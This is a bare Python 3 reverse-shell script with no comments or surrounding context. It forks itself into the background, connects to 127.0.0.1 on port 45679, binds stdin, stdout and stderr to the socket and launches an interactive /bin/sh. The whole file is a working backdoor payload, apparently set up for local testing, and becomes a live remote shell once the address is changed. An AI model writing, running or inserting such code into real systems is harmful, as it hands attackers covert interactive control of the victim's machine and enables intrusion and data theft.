#!/usr/bin/python3

import socket
import subprocess
import os
import sys

def daemonize():
    try:
        pid = os.fork()
        if pid > 0:
            os._exit(0)
    except OSError:
        sys.exit(1)

daemonize()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    try:
        s.connect(("127.0.0.1", 45679))
    except Exception as e:
        sys.exit(1)

    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)

    subprocess.call(["/bin/sh", "-i"])
